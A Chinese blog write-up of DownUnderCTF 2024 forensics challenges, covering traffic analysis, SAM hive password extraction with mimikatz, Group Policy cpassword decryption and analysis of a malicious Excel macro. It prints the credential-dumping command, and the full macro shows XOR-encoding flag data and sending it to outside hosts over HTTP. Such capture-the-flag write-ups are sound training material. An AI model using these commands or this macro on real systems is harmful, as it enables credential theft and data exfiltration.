<section style="margin: 10px auto; display: flex; justify-content: center;"><section style="display: flex;background: linear-gradient(to top,#cefcf7,#fffffe);overflow: hidden;"><section style="flex-shrink: 0;"><section style="width: 25px;height: 100%;background-color: #fffffe;box-sizing:border-box;transform:   skew(45deg) translateX(-15px);-webkit-transform:   skew(45deg) translateX(-15px);-moz-transform:   skew(45deg) translateX(-15px);-o-transform:   skew(45deg) translateX(-15px);"></section></section><section style="padding: 4px 5px;box-sizing:border-box;"><section style="font-size: 16px;color: #2e4b73;text-align: center;padding: 0 15px;box-sizing:border-box;"><strong>DownUnderCTF 2024——取证方向题解</strong></section><section style="width: 100%;height: 4px;background-color: #68feeb;border-radius: 5px;margin-top: -7px;max-width: 100% !important;box-sizing:border-box;"></section></section><section style="flex-shrink: 0;"><section style="width: 25px;height: 100%;background-color: #fffffe;box-sizing:border-box;transform:   skew(-45deg) translateX(15px);-webkit-transform:   skew(-45deg) translateX(15px);-moz-transform:   skew(-45deg) translateX(15px);-o-transform:   skew(-45deg) translateX(15px);"></section></section></section></section>



<section style="margin: 10px auto; display: flex; justify-content: center;"><section style="display: flex;"><section style="flex-shrink: 0;display: flex;align-items: flex-start;"><section><section style="width: 35px;border-bottom: 1px solid #0befd6;box-sizing:border-box;"></section><section style="width: 1px;border-right: 1px solid #0befd6;height: 15px;margin:-2px 0 0 -5px;box-sizing:border-box;transform:  rotate(35deg);-webkit-transform:  rotate(35deg);-moz-transform:  rotate(35deg);-o-transform:  rotate(35deg);"></section></section></section><section style="margin: 3px -25px;"><section style="font-size: 16px;color: #2e4b73;text-align: center;"><strong>前言</strong></section></section><section style="flex-shrink: 0;display: flex;align-items: flex-end;"><section style="display: flex;flex-direction: column;align-items: flex-end;"><section style="width: 1px;border-right: 1px solid #0befd6;height: 15px;margin:0 -5px -2px 0;box-sizing:border-box;transform:  rotate(35deg);-webkit-transform:  rotate(35deg);-moz-transform:  rotate(35deg);-o-transform:  rotate(35deg);"></section><section style="width: 35px;border-bottom: 1px solid #0befd6;box-sizing:border-box;"></section></section></section></section></section>

<section style="display: flex; align-items: center; border-left: 3px solid #d0d0d0; padding-left: 12px; margin: 10px 0; color: #666666; font-size: 17px; line-height: 1.75;">
&emsp;&emsp;经常参加取证赛事，跟CTF中的取证有很大差别，就想着整理一下CTF中的取证题，偶然发现有个国际赛专有方向的取证方向，就拿来复现一下
</section>



<section style="margin: 10px auto; display: flex; justify-content: flex-start; background: linear-gradient(to right, rgb(230, 253, 251), rgb(255, 255, 255));"><section style="flex-shrink: 0;display: flex;"><section style="display: flex;justify-content: center;align-items: center;background-color: #0befd6;justify-content: center;padding: 0 0 0 2px;box-sizing:border-box;"><section style="font-size: 16px;color: #ffffff;"><strong>0</strong><strong>1</strong></section></section><section style="flex-shrink: 0;"><section style="width: 0px;height: 1px;border-bottom: 24px solid transparent;border-left: 8px solid #0befd6;box-sizing:border-box;"></section></section></section><section style="display: flex;align-items: center;"><section style="font-size: 16px;color: #2e4b73;text-align: left;padding: 0 15px;box-sizing:border-box;"><strong>Baby's First Forensics</strong></section></section></section>

<section style="margin: 10px auto;"><section style="display: flex;margin-bottom: -26px;"><section style="flex-shrink: 0;display: flex;background-color: #fffffd;"><section style="flex-shrink: 0;"><section style="font-size: 16px; color: rgb(46, 75, 115); padding: 0px 5px 0px 15px; box-sizing: border-box; user-select: text !important;" draggable="true"><strong>题目描述</strong></section><section style="display: flex;justify-content: flex-end;align-items: center;"><section style="flex-shrink: 0;"><section style="width: 7px;height: 7px;border: 1px solid #0befd6;border-radius: 100%;box-sizing:border-box;"></section></section><section style="width: 100%;border-top: 1px solid #0befd6;max-width: 100% !important;box-sizing:border-box;"></section></section><section style="width: 100%;height: 4px;background-color: #fffffe;max-width: 100% !important;box-sizing:border-box;"></section></section><section style="flex-shrink: 0;padding: 0 11px 7px;box-sizing:border-box;"><section style="width: 8px;height: 100%;border-left: 1px solid #0befd6;background-color: #fffffe;box-sizing:border-box;transform:      skew(-45deg);-webkit-transform:      skew(-45deg);-moz-transform:      skew(-45deg);-o-transform:      skew(-45deg);"></section></section></section><section style="flex-shrink: 0;margin-left: -26px;display: flex;align-items: flex-end;"><section style="width: 0px;height: 1px;border-right: 26px solid #ecfefc;border-top: 26px solid transparent;box-sizing:border-box;"></section></section><section style="width: 100%;border-top: 1px solid #0befd6;margin-left: -4px;z-index: 9;max-width: 100% !important;box-sizing:border-box;"></section></section><section style="width: 100%;height: 30px;background-color: #ecfefc;max-width: 100% !important;box-sizing:border-box;"></section><section style="padding: 10px 10px 10px ;background-color: #ecfefc;box-sizing:border-box;"><section style="text-align: justify;line-height:1.75em;letter-spacing: 1.5px;font-size:14px;color:#161616;background: transparent;"><p>They've been trying to breach our infrastructure all morning! They're trying to get more info on our covert kangaroos! We need your help, we've captured some traffic of them attacking us, can you tell us what tool they were using and its version?<br>
NOTE: Wrap your answer in the DUCTF{}, e.g. DUCTF{nmap_7.25}<br>
<br>
他们整个上午都在试图破坏我们的基础设施！他们正试图获得更多关于我们秘密袋鼠的信息！我们需要您的帮助，我们已经捕获了一些他们攻击我们的流量，您能告诉我们他们使用的是什么工具及其版本吗？<br>
注意：将您的答案包装在 DUCTF{} 中，例如 DUCTF{nmap_7.25}    
</p></section></section></section>

<section style="display: flex;"><section style="flex-shrink: 0;display: flex;align-items: flex-start;"><section><section style="width: 35px;border-bottom: 1px solid #0befd6;box-sizing:border-box;"></section><section style="width: 1px;border-right: 1px solid #0befd6;height: 15px;margin:-2px 0 0 -5px;box-sizing:border-box;transform:  rotate(35deg);-webkit-transform:  rotate(35deg);-moz-transform:  rotate(35deg);-o-transform:  rotate(35deg);"></section></section></section><section style="margin: 3px -25px;"><section style="font-size: 16px;color: #2e4b73;text-align: center;"><strong>解题过程</strong></section></section><section style="flex-shrink: 0;display: flex;align-items: flex-end;"><section style="display: flex;flex-direction: column;align-items: flex-end;"><section style="width: 1px;border-right: 1px solid #0befd6;height: 15px;margin:0 -5px -2px 0;box-sizing:border-box;transform:  rotate(35deg);-webkit-transform:  rotate(35deg);-moz-transform:  rotate(35deg);-o-transform:  rotate(35deg);"></section><section style="width: 35px;border-bottom: 1px solid #0befd6;box-sizing:border-box;"></section></section></section></section>

题目拿到是个流量包，对于这种分析黑客攻击流量的题，首先查看HTTP流，直接就可以发现黑客的工具和版本

![](https://github.com/tac-eL/tacel.github.io/blob/img/2024/7/15/image1.png?raw=true)

`flag: DUCTF{Nikto_2.1.6}`



<section style="margin: 10px auto; display: flex; justify-content: flex-start; background: linear-gradient(to right, rgb(230, 253, 251), rgb(255, 255, 255));"><section style="flex-shrink: 0;display: flex;"><section style="display: flex;justify-content: center;align-items: center;background-color: #0befd6;justify-content: center;padding: 0 0 0 2px;box-sizing:border-box;"><section style="font-size: 16px;color: #ffffff;"><strong>0</strong><strong>2</strong></section></section><section style="flex-shrink: 0;"><section style="width: 0px;height: 1px;border-bottom: 24px solid transparent;border-left: 8px solid #0befd6;box-sizing:border-box;"></section></section></section><section style="display: flex;align-items: center;"><section style="font-size: 16px;color: #2e4b73;text-align: left;padding: 0 15px;box-sizing:border-box;"><strong>SAM I AM</strong></section></section></section>

<section style="margin: 10px auto;"><section style="display: flex;margin-bottom: -26px;"><section style="flex-shrink: 0;display: flex;background-color: #fffffd;"><section style="flex-shrink: 0;"><section style="font-size: 16px; color: rgb(46, 75, 115); padding: 0px 5px 0px 15px; box-sizing: border-box; user-select: text !important;" draggable="true"><strong>题目描述</strong></section><section style="display: flex;justify-content: flex-end;align-items: center;"><section style="flex-shrink: 0;"><section style="width: 7px;height: 7px;border: 1px solid #0befd6;border-radius: 100%;box-sizing:border-box;"></section></section><section style="width: 100%;border-top: 1px solid #0befd6;max-width: 100% !important;box-sizing:border-box;"></section></section><section style="width: 100%;height: 4px;background-color: #fffffe;max-width: 100% !important;box-sizing:border-box;"></section></section><section style="flex-shrink: 0;padding: 0 11px 7px;box-sizing:border-box;"><section style="width: 8px;height: 100%;border-left: 1px solid #0befd6;background-color: #fffffe;box-sizing:border-box;transform:      skew(-45deg);-webkit-transform:      skew(-45deg);-moz-transform:      skew(-45deg);-o-transform:      skew(-45deg);"></section></section></section><section style="flex-shrink: 0;margin-left: -26px;display: flex;align-items: flex-end;"><section style="width: 0px;height: 1px;border-right: 26px solid #ecfefc;border-top: 26px solid transparent;box-sizing:border-box;"></section></section><section style="width: 100%;border-top: 1px solid #0befd6;margin-left: -4px;z-index: 9;max-width: 100% !important;box-sizing:border-box;"></section></section><section style="width: 100%;height: 30px;background-color: #ecfefc;max-width: 100% !important;box-sizing:border-box;"></section><section style="padding: 10px 10px 10px ;background-color: #ecfefc;box-sizing:border-box;"><section style="text-align: justify;line-height:1.75em;letter-spacing: 1.5px;font-size:14px;color:#161616;background: transparent;"><p>
    The attacker managed to gain Domain Admin on our rebels Domain Controller! Looks like they managed to log on with an account using WMI and dumped some files. Can you reproduce how they got the Administrator's Password with the artifacts provided?<br>
Place the Administrator Account's Password in DUCTF{}, e.g. DUCTF{password123!}<br>
    <br>
攻击者设法在我们的反叛者域控制器上获得了域管理员！看起来他们设法使用 WMI 使用帐户登录并转储了一些文件。
您能否重现他们如何使用提供的工件获得管理员密码？<br>
将管理员帐户的密码放在 DUCTF{} 中，例如 DUCTF{password123!}
</p></section></section></section>

<section style="display: flex;"><section style="flex-shrink: 0;display: flex;align-items: flex-start;"><section><section style="width: 35px;border-bottom: 1px solid #0befd6;box-sizing:border-box;"></section><section style="width: 1px;border-right: 1px solid #0befd6;height: 15px;margin:-2px 0 0 -5px;box-sizing:border-box;transform:  rotate(35deg);-webkit-transform:  rotate(35deg);-moz-transform:  rotate(35deg);-o-transform:  rotate(35deg);"></section></section></section><section style="margin: 3px -25px;"><section style="font-size: 16px;color: #2e4b73;text-align: center;"><strong>解题过程</strong></section></section><section style="flex-shrink: 0;display: flex;align-items: flex-end;"><section style="display: flex;flex-direction: column;align-items: flex-end;"><section style="width: 1px;border-right: 1px solid #0befd6;height: 15px;margin:0 -5px -2px 0;box-sizing:border-box;transform:  rotate(35deg);-webkit-transform:  rotate(35deg);-moz-transform:  rotate(35deg);-o-transform:  rotate(35deg);"></section><section style="width: 35px;border-bottom: 1px solid #0befd6;box-sizing:border-box;"></section></section></section></section>

题目附件是`SAM`和`system`文件，可以利用这两个文件来获得计算机密码，可以用`SAMinside`或者`mimikatz`
来提取密码。本题我们用`mimikatz`来解，有兴趣的可以尝试下`SAMinside`

`mimikatz`地址：https://github.com/gentilkiwi/mimikatz

```bash
lsadump::sam /sam:sam.bak /system:system.bak
```

![](https://github.com/tac-eL/tacel.github.io/blob/img/2024/7/15/image2.png?raw=true)

拿到MD5值后找个网站解密即可，`hashcat`也可

![](https://github.com/tac-eL/tacel.github.io/blob/img/2024/7/15/image3.png?raw=true)

`flag: DUCTF{!checkerboard1}`



<section style="margin: 10px auto; display: flex; justify-content: flex-start; background: linear-gradient(to right, rgb(230, 253, 251), rgb(255, 255, 255));"><section style="flex-shrink: 0;display: flex;"><section style="display: flex;justify-content: center;align-items: center;background-color: #0befd6;justify-content: center;padding: 0 0 0 2px;box-sizing:border-box;"><section style="font-size: 16px;color: #ffffff;"><strong>0</strong><strong>3</strong></section></section><section style="flex-shrink: 0;"><section style="width: 0px;height: 1px;border-bottom: 24px solid transparent;border-left: 8px solid #0befd6;box-sizing:border-box;"></section></section></section><section style="display: flex;align-items: center;"><section style="font-size: 16px;color: #2e4b73;text-align: left;padding: 0 15px;box-sizing:border-box;"><strong>Bad Policies</strong></section></section></section>

<section style="margin: 10px auto;"><section style="display: flex;margin-bottom: -26px;"><section style="flex-shrink: 0;display: flex;background-color: #fffffd;"><section style="flex-shrink: 0;"><section style="font-size: 16px; color: rgb(46, 75, 115); padding: 0px 5px 0px 15px; box-sizing: border-box; user-select: text !important;" draggable="true"><strong>题目描述</strong></section><section style="display: flex;justify-content: flex-end;align-items: center;"><section style="flex-shrink: 0;"><section style="width: 7px;height: 7px;border: 1px solid #0befd6;border-radius: 100%;box-sizing:border-box;"></section></section><section style="width: 100%;border-top: 1px solid #0befd6;max-width: 100% !important;box-sizing:border-box;"></section></section><section style="width: 100%;height: 4px;background-color: #fffffe;max-width: 100% !important;box-sizing:border-box;"></section></section><section style="flex-shrink: 0;padding: 0 11px 7px;box-sizing:border-box;"><section style="width: 8px;height: 100%;border-left: 1px solid #0befd6;background-color: #fffffe;box-sizing:border-box;transform:      skew(-45deg);-webkit-transform:      skew(-45deg);-moz-transform:      skew(-45deg);-o-transform:      skew(-45deg);"></section></section></section><section style="flex-shrink: 0;margin-left: -26px;display: flex;align-items: flex-end;"><section style="width: 0px;height: 1px;border-right: 26px solid #ecfefc;border-top: 26px solid transparent;box-sizing:border-box;"></section></section><section style="width: 100%;border-top: 1px solid #0befd6;margin-left: -4px;z-index: 9;max-width: 100% !important;box-sizing:border-box;"></section></section><section style="width: 100%;height: 30px;background-color: #ecfefc;max-width: 100% !important;box-sizing:border-box;"></section><section style="padding: 10px 10px 10px ;background-color: #ecfefc;box-sizing:border-box;"><section style="text-align: justify;line-height:1.75em;letter-spacing: 1.5px;font-size:14px;color:#161616;background: transparent;"><p>
Looks like the attacker managed to access the rebels Domain Controller.<br>
Can you figure out how they got access after pulling these artifacts from one of our Outpost machines?<br>
    <br>
看起来攻击者设法访问了反叛分子的域控制器。<br>
你能弄清楚他们是如何从我们的一台 Outpost 机器中提取这些文物后获得访问权限的吗？
</p></section></section></section>

<section style="display: flex;"><section style="flex-shrink: 0;display: flex;align-items: flex-start;"><section><section style="width: 35px;border-bottom: 1px solid #0befd6;box-sizing:border-box;"></section><section style="width: 1px;border-right: 1px solid #0befd6;height: 15px;margin:-2px 0 0 -5px;box-sizing:border-box;transform:  rotate(35deg);-webkit-transform:  rotate(35deg);-moz-transform:  rotate(35deg);-o-transform:  rotate(35deg);"></section></section></section><section style="margin: 3px -25px;"><section style="font-size: 16px;color: #2e4b73;text-align: center;"><strong>解题过程</strong></section></section><section style="flex-shrink: 0;display: flex;align-items: flex-end;"><section style="display: flex;flex-direction: column;align-items: flex-end;"><section style="width: 1px;border-right: 1px solid #0befd6;height: 15px;margin:0 -5px -2px 0;box-sizing:border-box;transform:  rotate(35deg);-webkit-transform:  rotate(35deg);-moz-transform:  rotate(35deg);-o-transform:  rotate(35deg);"></section><section style="width: 35px;border-bottom: 1px solid #0befd6;box-sizing:border-box;"></section></section></section></section>

拿到附件是一脸懵的，结合题目名和附件可以猜测，bad
poclicies是不好的策略，这些附件名应该是策略的唯一ID，结合题目分析，应该是策略出现问题导致域控制器被拿下，结合以上信息，我找到了如下文章

[域渗透——利用SYSVOL还原组策略中保存的密码](https://www.cnblogs.com/404p3rs0n/p/15675872.html)

![](https://github.com/tac-eL/tacel.github.io/blob/img/2024/7/15/image4.png?raw=true)

通过学习我们了解到配置文件`Groups.xml`下的`cpassword`项记录着加密后的密码，用`everything`找到`groups.xml`

![](https://github.com/tac-eL/tacel.github.io/blob/img/2024/7/15/image5.png?raw=true)

```bash
cpassword="B+iL/dnbBHSlVf66R8HOuAiGHAtFOVLZwXu0FYf+jQ6553UUgGNwSZucgdz98klzBuFqKtTpO1bRZIsrF8b4Hu5n6KccA7SBWlbLBWnLXAkPquHFwdC70HXBcRlz38q2"
```

找到后利用Kali自带的组策略解密工具`gpp-decrypt`解密，`gpp`是`Group Policy Preferences`
（组策略首选项）的缩写，也可以用链接里大佬的方法来解密

![](https://github.com/tac-eL/tacel.github.io/blob/img/2024/7/15/image6.jpeg?raw=true)

`flag: DUCTF{D0n7_Us3_P4s5w0rds_1n_Gr0up_P0l1cy}`



<section style="margin: 10px auto; display: flex; justify-content: flex-start; background: linear-gradient(to right, rgb(230, 253, 251), rgb(255, 255, 255));"><section style="flex-shrink: 0;display: flex;"><section style="display: flex;justify-content: center;align-items: center;background-color: #0befd6;justify-content: center;padding: 0 0 0 2px;box-sizing:border-box;"><section style="font-size: 16px;color: #ffffff;"><strong>0</strong><strong>4</strong></section></section><section style="flex-shrink: 0;"><section style="width: 0px;height: 1px;border-bottom: 24px solid transparent;border-left: 8px solid #0befd6;box-sizing:border-box;"></section></section></section><section style="display: flex;align-items: center;"><section style="font-size: 16px;color: #2e4b73;text-align: left;padding: 0 15px;box-sizing:border-box;"><strong>emuc2</strong></section></section></section>

<section style="margin: 10px auto;"><section style="display: flex;margin-bottom: -26px;"><section style="flex-shrink: 0;display: flex;background-color: #fffffd;"><section style="flex-shrink: 0;"><section style="font-size: 16px; color: rgb(46, 75, 115); padding: 0px 5px 0px 15px; box-sizing: border-box; user-select: text !important;" draggable="true"><strong>题目描述</strong></section><section style="display: flex;justify-content: flex-end;align-items: center;"><section style="flex-shrink: 0;"><section style="width: 7px;height: 7px;border: 1px solid #0befd6;border-radius: 100%;box-sizing:border-box;"></section></section><section style="width: 100%;border-top: 1px solid #0befd6;max-width: 100% !important;box-sizing:border-box;"></section></section><section style="width: 100%;height: 4px;background-color: #fffffe;max-width: 100% !important;box-sizing:border-box;"></section></section><section style="flex-shrink: 0;padding: 0 11px 7px;box-sizing:border-box;"><section style="width: 8px;height: 100%;border-left: 1px solid #0befd6;background-color: #fffffe;box-sizing:border-box;transform:      skew(-45deg);-webkit-transform:      skew(-45deg);-moz-transform:      skew(-45deg);-o-transform:      skew(-45deg);"></section></section></section><section style="flex-shrink: 0;margin-left: -26px;display: flex;align-items: flex-end;"><section style="width: 0px;height: 1px;border-right: 26px solid #ecfefc;border-top: 26px solid transparent;box-sizing:border-box;"></section></section><section style="width: 100%;border-top: 1px solid #0befd6;margin-left: -4px;z-index: 9;max-width: 100% !important;box-sizing:border-box;"></section></section><section style="width: 100%;height: 30px;background-color: #ecfefc;max-width: 100% !important;box-sizing:border-box;"></section><section style="padding: 10px 10px 10px ;background-color: #ecfefc;box-sizing:border-box;"><section style="text-align: justify;line-height:1.75em;letter-spacing: 1.5px;font-size:14px;color:#161616;background: transparent;"><p>
As all good nation states, we have our own malware and C2 for offensive operations. But someone has got the source code and is using it against us! Here's a capture of traffic we found on one of our laptops...<br>
    <br>
与所有优秀的民族国家一样，我们有自己的恶意软件和 C2 用于进攻性操作。但是有人得到了源代码，并用它来对付我们！这是我们在一台笔记本电脑上发现的流量捕获......<br>
附件：sslkeylogfile.txt 、challenge.pcap</p></section></section></section>

<section style="display: flex;"><section style="flex-shrink: 0;display: flex;align-items: flex-start;"><section><section style="width: 35px;border-bottom: 1px solid #0befd6;box-sizing:border-box;"></section><section style="width: 1px;border-right: 1px solid #0befd6;height: 15px;margin:-2px 0 0 -5px;box-sizing:border-box;transform:  rotate(35deg);-webkit-transform:  rotate(35deg);-moz-transform:  rotate(35deg);-o-transform:  rotate(35deg);"></section></section></section><section style="margin: 3px -25px;"><section style="font-size: 16px;color: #2e4b73;text-align: center;"><strong>解题过程</strong></section></section><section style="flex-shrink: 0;display: flex;align-items: flex-end;"><section style="display: flex;flex-direction: column;align-items: flex-end;"><section style="width: 1px;border-right: 1px solid #0befd6;height: 15px;margin:0 -5px -2px 0;box-sizing:border-box;transform:  rotate(35deg);-webkit-transform:  rotate(35deg);-moz-transform:  rotate(35deg);-o-transform:  rotate(35deg);"></section><section style="width: 35px;border-bottom: 1px solid #0befd6;box-sizing:border-box;"></section></section></section></section>

给出这个`sslkey`可以发现是需要在`wireshark`上进行`TLS`解密，上一次见这种还是在首届盘古石决赛的题目里

在编辑->首选项里，`Protocols`选项下找到`TLS`，在`(Pre)-Master-Secret log file`栏目选择`txt文件`即可。

![](https://github.com/tac-eL/tacel.github.io/blob/img/2024/7/15/image7.png?raw=true)

![](https://github.com/tac-eL/tacel.github.io/blob/img/2024/7/15/image8.png?raw=true)

解密完成后分析流量包，发现这里不是`HTTP1.1`都是`HTTP2`，流量分析最好的方式还是逐个流分析，追踪`HTTP2`
后在第8流发现网站登录密码

![](https://github.com/tac-eL/tacel.github.io/blob/img/2024/7/15/image9.png?raw=true)

在第23流发现GET请求，下面一大堆也许是文件名

![](https://github.com/tac-eL/tacel.github.io/blob/img/2024/7/15/image10.png?raw=true)

在第34流发现JWT token字样

![](https://github.com/tac-eL/tacel.github.io/blob/img/2024/7/15/image11.png?raw=true)

再然后，应该是登录进网站，需要伪造管理员权限来获取flag，利用`JWT token`
，而第23流里的一大堆文件里应该就有管理员的`JWT token`，由于需要在线环境，这题无法继续复现下去，可以参考其他大佬比赛期间写的WP



<section style="margin: 10px auto; display: flex; justify-content: flex-start; background: linear-gradient(to right, rgb(230, 253, 251), rgb(255, 255, 255));"><section style="flex-shrink: 0;display: flex;"><section style="display: flex;justify-content: center;align-items: center;background-color: #0befd6;justify-content: center;padding: 0 0 0 2px;box-sizing:border-box;"><section style="font-size: 16px;color: #ffffff;"><strong>0</strong><strong>5</strong></section></section><section style="flex-shrink: 0;"><section style="width: 0px;height: 1px;border-bottom: 24px solid transparent;border-left: 8px solid #0befd6;box-sizing:border-box;"></section></section></section><section style="display: flex;align-items: center;"><section style="font-size: 16px;color: #2e4b73;text-align: left;padding: 0 15px;box-sizing:border-box;"><strong>Macro Magic</strong></section></section></section>

<section style="margin: 10px auto;"><section style="display: flex;margin-bottom: -26px;"><section style="flex-shrink: 0;display: flex;background-color: #fffffd;"><section style="flex-shrink: 0;"><section style="font-size: 16px; color: rgb(46, 75, 115); padding: 0px 5px 0px 15px; box-sizing: border-box; user-select: text !important;" draggable="true"><strong>题目描述</strong></section><section style="display: flex;justify-content: flex-end;align-items: center;"><section style="flex-shrink: 0;"><section style="width: 7px;height: 7px;border: 1px solid #0befd6;border-radius: 100%;box-sizing:border-box;"></section></section><section style="width: 100%;border-top: 1px solid #0befd6;max-width: 100% !important;box-sizing:border-box;"></section></section><section style="width: 100%;height: 4px;background-color: #fffffe;max-width: 100% !important;box-sizing:border-box;"></section></section><section style="flex-shrink: 0;padding: 0 11px 7px;box-sizing:border-box;"><section style="width: 8px;height: 100%;border-left: 1px solid #0befd6;background-color: #fffffe;box-sizing:border-box;transform:      skew(-45deg);-webkit-transform:      skew(-45deg);-moz-transform:      skew(-45deg);-o-transform:      skew(-45deg);"></section></section></section><section style="flex-shrink: 0;margin-left: -26px;display: flex;align-items: flex-end;"><section style="width: 0px;height: 1px;border-right: 26px solid #ecfefc;border-top: 26px solid transparent;box-sizing:border-box;"></section></section><section style="width: 100%;border-top: 1px solid #0befd6;margin-left: -4px;z-index: 9;max-width: 100% !important;box-sizing:border-box;"></section></section><section style="width: 100%;height: 30px;background-color: #ecfefc;max-width: 100% !important;box-sizing:border-box;"></section><section style="padding: 10px 10px 10px ;background-color: #ecfefc;box-sizing:border-box;"><section style="text-align: justify;line-height:1.75em;letter-spacing: 1.5px;font-size:14px;color:#161616;background: transparent;"><p>
    We managed to pull this excel spreadsheet artifact from one of our Outpost machines. Its got something sus happening under the hood. After opening we found and captured some suspicious traffic on our network. Can you find out what this traffic is and find the flag!<br><br>
我们成功地从一个前哨机器上提取了这个Excel电子表格文件。它在内部有些可疑的活动。打开后，我们在我们的网络上发现了一些可疑的流量。你能找出这些流量是什么，并找到旗帜吗?<br><br>
注意：您不需要运行或启用宏，因此请解决。</p></section></section></section>

<section style="display: flex;"><section style="flex-shrink: 0;display: flex;align-items: flex-start;"><section><section style="width: 35px;border-bottom: 1px solid #0befd6;box-sizing:border-box;"></section><section style="width: 1px;border-right: 1px solid #0befd6;height: 15px;margin:-2px 0 0 -5px;box-sizing:border-box;transform:  rotate(35deg);-webkit-transform:  rotate(35deg);-moz-transform:  rotate(35deg);-o-transform:  rotate(35deg);"></section></section></section><section style="margin: 3px -25px;"><section style="font-size: 16px;color: #2e4b73;text-align: center;"><strong>解题过程</strong></section></section><section style="flex-shrink: 0;display: flex;align-items: flex-end;"><section style="display: flex;flex-direction: column;align-items: flex-end;"><section style="width: 1px;border-right: 1px solid #0befd6;height: 15px;margin:0 -5px -2px 0;box-sizing:border-box;transform:  rotate(35deg);-webkit-transform:  rotate(35deg);-moz-transform:  rotate(35deg);-o-transform:  rotate(35deg);"></section><section style="width: 35px;border-bottom: 1px solid #0befd6;box-sizing:border-box;"></section></section></section></section>

打开Excel发现是一堆猴子，还提示我宏已经被禁用，而且此题告诉我不需要我来运行或者启动

首先来了解一下Excel里宏的概念

宏是使用VBA编程语言编写的，可以在Excel中自动执行一系列操作的指令集

这道题的目的是让我们来分析宏，我们可以使用oletools分析 具体项目地址：https://github.com/decalage2/oletools

```bash
pip install -U oletools
```

![](https://github.com/tac-eL/tacel.github.io/blob/img/2024/7/15/image12.png?raw=true)

![](https://github.com/tac-eL/tacel.github.io/blob/img/2024/7/15/image13.png?raw=true)

分析出大量数据，其中还包括base64编码，发现是假数据，也是，毕竟附件除了excel还有一个流量包，等会儿去看看

![](https://github.com/tac-eL/tacel.github.io/blob/img/2024/7/15/image14.png?raw=true)

把提取出的代码保存

```vbscript
Public Function anotherThing(B As String, C As String) As String
    Dim I As Long
    Dim A As String
    For I = 1 To Len(B)
        A = A & Chr(Asc(Mid(B, I, 1)) Xor Asc(Mid(C, (I - 1) Mod Len(C) + 1, 1)))
    Next I
    anotherThing = A
End Function

Public Function importantThing()
    Dim tempString As String
    Dim tempInteger As Integer
    Dim I As Integer
    Dim J As Integer
    For I = 1 To 5
        Cells(I, 2).Value = WorksheetFunction.RandBetween(0, 1000)
    Next I
    For I = 1 To 5
        For J = I + 1 To 5
            If Cells(J, 2).Value < Cells(I, 2).Value Then
                tempString = Cells(I, 1).Value
                Cells(I, 1).Value = Cells(J, 1).Value
                Cells(J, 1).Value = tempString
                tempInteger = Cells(I, 2).Value
                Cells(I, 2).Value = Cells(J, 2).Value
                Cells(J, 2).Value = tempInteger
            End If
        Next J
    Next I
End Function

Public Function totalyFine(A As String) As String
    Dim B As String
    B = Replace(A, " ", "-")
    totalyFine = B
End Function

Sub macro1()
    Dim Path As String
    Dim wb As Workbook
    Dim A As String
    Dim B As String
    Dim C As String
    Dim D As String
    Dim E As String
    Dim F As String
    Dim G As String
    Dim H As String
    Dim J As String
    Dim K As String
    Dim L As String
    Dim M As String
    Dim N As String
    Dim O As String
    Dim P As String
    Dim Q As String
    Dim R As String
    Dim S As String
    Dim T As String
    Dim U As String
    Dim V As String
    Dim W As String
    Dim X As String
    Dim Y As String
    Dim Z As String
    Dim I As Long

    N = importantThing()
    K = "Yes"
    S = "Mon"
    U = forensics(K)
    V = totalyFine(U)
    D = "Ma"
    J = "https://play.duc.tf/" + V
    superThing J
    J = "http://flag.com/"
    superThing J
    G = "key"
    J = "http://play.duc.tf/"
    superThing J
    J = "http://en.wikipedia.org/wiki/Emu_War"
    superThing J
    N = importantThing()
    Path = ThisWorkbook.Path & "\flag.xlsx"
    Set wb = Workbooks.Open(Path)
    Dim valueA1 As Variant
    valueA1 = wb.Sheets(1).Range("A1").Value
    MsgBox valueA1
    wb.Close SaveChanges:=False
    F = "gic"
    N = importantThing()
    Q = "Flag: " & valueA1
    H = "Try Harder"
    U = forensics(H)
    V = totalyFine(U)
    J = "http://downunderctf.com/" + V
    superThing J
    W = S + G + D + F
    O = doThing(Q, W)
    M = anotherThing(O, W)
    A = something(O)
    Z = forensics(O)
    N = importantThing()
    P = "Pterodactyl"
    U = forensics(P)
    V = totalyFine(U)
    J = "http://play.duc.tf/" + V
    superThing J
    T = totalyFine(Z)
    MsgBox T
    J = "http://downunderctf.com/" + T
    superThing J
    N = importantThing()
    E = "Forensics"
    U = forensics(E)
    V = totalyFine(U)
    J = "http://play.duc.tf/" + V
    superThing J
End Sub

Public Function doThing(B As String, C As String) As String
    Dim I As Long
    Dim A As String
    For I = 1 To Len(B)
        A = A & Chr(Asc(Mid(B, I, 1)) Xor Asc(Mid(C, (I - 1) Mod Len(C) + 1, 1)))
    Next I
    doThing = A
End Function

Public Function superThing(ByVal A As String) As String
    With CreateObject("MSXML2.ServerXMLHTTP.6.0")
        .Open "GET", A, False
        .Send
        superThing = StrConv(.responseBody, vbUnicode)
    End With
End Function

Public Function something(B As String) As String
    Dim I As Long
    Dim A As String
    For I = 1 To Len(inputText)
        A = A & WorksheetFunction.Dec2Bin(Asc(Mid(B, I, 1)))
    Next I
    something = A
End Function

Public Function forensics(B As String) As String
    Dim A() As Byte
    Dim I As Integer
    Dim C As String
    A = StrConv(B, vbFromUnicode)
    For I = LBound(A) To UBound(A)
        C = C & CStr(A(I)) & " "
    Next I
    C = Trim(C)
    forensics = C
End Function

```

```vb
    W = S + G + D + F
    O = doThing(Q, W)
    M = anotherThing(O, W)
```

上述代码中有以上几句，其中`anotherThing`函数是定义了一个异或操作，而`W`是几个变量值拼接得来，所以`W`是密钥

```vb
    S = "Mon"
    G = "key"
    D = "Ma"
    F = "gic"
    W = "MonkeyMagic"
```

明文通过`anotherThing`异或为密文，已知密钥，找到密文后异或解密即可，因为给了流量包，那密文应该就藏在流量包里

在查看HTTP对象时，发现URL里有一堆的ASCII码，猜测应该就是密文，凭借经验就能看出第三个最长的是密文，不放心的可以试试其他三个，10进制转字符后分别是`Try Harder`、`Pterodactyl`、`Forensics`

![](https://github.com/tac-eL/tacel.github.io/blob/img/2024/7/15/image15.png?raw=true)

解密即可

```python
def decode(encoded, key):
    a = ''.join(chr(encoded[i] ^ ord(key[(i) % len(key)])) for i in range(len(encoded)))
    return a

m = [11, 3, 15, 12, 95, 89, 9, 52, 36, 61, 37, 54, 34, 90, 15, 86, 38, 26, 80, 19, 1, 60, 12, 38, 49, 9, 28, 38, 0, 81, 9, 2, 80, 52, 28, 19]
key = "MonkeyMagic"

flag = decode(m, key)
print(flag)
```

`flag: DUCTF{M4d3_W1th_AI_by_M0nk3ys}`



